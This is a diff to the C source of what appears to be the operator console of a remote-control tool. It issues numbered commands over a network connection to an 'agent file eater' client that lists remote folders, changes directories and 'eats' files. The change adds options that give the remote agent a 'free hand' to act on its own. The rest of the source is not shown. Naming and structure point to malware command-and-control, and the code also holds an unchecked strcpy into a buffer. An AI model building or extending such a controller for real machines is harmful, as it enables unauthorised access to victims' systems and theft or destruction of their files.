@@ -190,6 +190,10 @@ void writeToBuffer(char data[])
 	strcpy(buffer, data);
 }
 
+void showHelpBanner()
+{
+}
+
 int main(int argc, char *argv[])
 {
 
@@ -233,12 +237,15 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "     \\/                 \\/          \\/     \\/          \\/       \n");
 		fprintf(stderr, "\n");
 		fprintf(stderr, "\nThese are your options :-\n\n");
-		fprintf(stderr, "[0] Quit.\n");
-		fprintf(stderr, "[1] Get list of files in CWD.\n");
-		fprintf(stderr, "[2] Get path of CWD.\n");
-		fprintf(stderr, "[3] Go to a specific folder in CWD.\n");
-		fprintf(stderr, "[4] Go to parent folder of CWD.\n");
-		fprintf(stderr, "[5] Eat a file in CWD.\n");
+		fprintf(stderr, "(0) Quit.\n");
+		fprintf(stderr, "(1) Get list of files in CWD.\n");
+		fprintf(stderr, "(2) Get path of CWD.\n");
+		fprintf(stderr, "(3) Go to a specific folder in CWD.\n");
+		fprintf(stderr, "(4) Go to parent folder of CWD.\n");
+		fprintf(stderr, "(5) Eat a file in CWD.\n");
+		fprintf(stderr, "(6) Give Free Hand.\n");
+		fprintf(stderr, "(7) Take Away Free Hand.\n");
+		fprintf(stderr, "(8) Help Manaual\n");
 
 		fprintf(stderr, "\nYour selected option: ");
 		fflush(stdin);
@@ -342,8 +349,40 @@ int main(int argc, char *argv[])
 
 			break;
 
+		case 6:
+			fprintf(stderr, "\n[+] Giving free hand to agent file eater...");
+
+			// Asking client to send cwd
+			writeToBuffer(" 6");
+			reliableSend();
+
+			// Recieving data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] Report says:");
+			puts(buffer);
+
+			break;
+
+		case 7:
+			fprintf(stderr, "\n[+] Taking free hand from agent file eater...");
+
+			// Asking client to send cwd
+			writeToBuffer(" 7");
+			reliableSend();
+
+			// Recieving data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] Report says:");
+			puts(buffer);
+
+			break;
+
+		case 8:
+			showHelpBanner();
+			break;
+
 		default:
-			fprintf(stderr, "Incorrect Option Chosen.");
+			fprintf(stderr, "\n[-] Incorrect Option Chosen.");
 			break;
 		}
 
